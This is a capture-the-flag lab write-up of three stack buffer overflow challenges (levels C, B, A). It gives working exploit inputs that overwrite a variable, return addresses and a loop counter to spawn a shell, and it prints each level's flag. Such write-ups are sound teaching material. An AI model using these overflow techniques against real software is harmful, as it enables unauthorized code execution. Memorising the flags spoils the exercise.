## lab02

**Level C**
From the source code, what we have to do is straight-forward.
``` cs
int set_me = 0;
char buf[15];
strcpy(buf, argv[1]);

if(set_me == 0xdeadbeef)
	shell();
else
	printf("Not authenticated.\nset_me was %d\n", set_me);
```
According to the behavior of `strcpy(dest, src)`, the content of `src` will be copy to the `dest` until a `'\0'` in `src` is found. So we can input an over-length `argv[1]` (longer than 15) so that the variable `set_me` becomes `0xdeadbeef` (`int` type in little endian).
Since `0xdeadbeef` is not a valid ascii type string, we need to redirect input argument to a shell call:
``` bash
./lab2C $(echo -e "0123456789abcde\xef\xbe\xad\xde")
```
![flagc](02c1.png)
The flag is `1m_all_ab0ut_d4t_b33f`.

---

**Level B**
What we have to do is writing `shell()` function and `exec_string` parameter into stack so that program will execute it after returning from some other function (in this problem, the `print_name` function).
First I need to find addresses of them.
![findaddr](02b1.png)
Then locate the pointer `buf` which will be overflowed.
![buf](02b2.png)
We see that the frame size of function `print_name` is 28 bytes, where `buf` stays at 1 byte offset. Hence an input of size exceeding 27 bytes will cause a segmentation fault. Then we append the address of `shell` function (superisingly in little endian) to it.
![cmd](02b3.png)
`cmd` parameter is stored at `ebp+0x8`, where the value of `ebp` is the address of `shell` function, hence I concantenate the address of `exec_string` (also in little endian) at 8 bytes offset after `shell`'s address. Hence the final input is:
``` python
'Q'*27 + '\xbd\x86\x04\x08' + 'Q'*4 + '\xd0\x87\x04\x08'
```
![flagb](02b4.png)
The flag is `i_c4ll_wh4t_i_w4nt_n00b`.

---

**Level A**
From the assembly code I can locate the addresses of the struct locals:
+ `locals.word_buf`: ebp-0x28
+ `locals.i`: ebp-0x1c
+ `locals.cat_pointer`: ebp-0x18
+ `locals.cat_buf`: ebp-0x14

Since `word_buf` has only 12 bytes long but `fgets` take 16 bytes input buffer, we can overwrite `i` by input a long `word_buf` so that input will continue rather than just 10 times (the jump condition `local.i!=10` is the vulnerability).
The return address is 24 bytes from `cat_buf`, we cannot modify the stack by purposively input, as shown:
``` bash
python -c "print 'a'*12+'\xaa'*4+'\n' + 'a\n' * 22 + '\xfd\n\x86\n\x04\n\x08\n'" > /tmp/key
```
Then redirect to the binary's input.
``` bash
cat /tmp/key | ./lab2A
```
![wrongshell](02a1.png)
However, here is a small mistake since the input of shell is inherient from the parent process, after `/tmp/key` meets an `EOF`, the child process will automatically return. (Which spends me hours stucking on it)
The solution is holding `stdin` as follow (with the help from nice guys in chatroom):
``` bash
(cat /tmp/key; cat) | ./lab2A
```
![flaga](02a2.png)
The flag is `D1d_y0u_enj0y_y0ur_cats?`.
Yes, it is really fancy.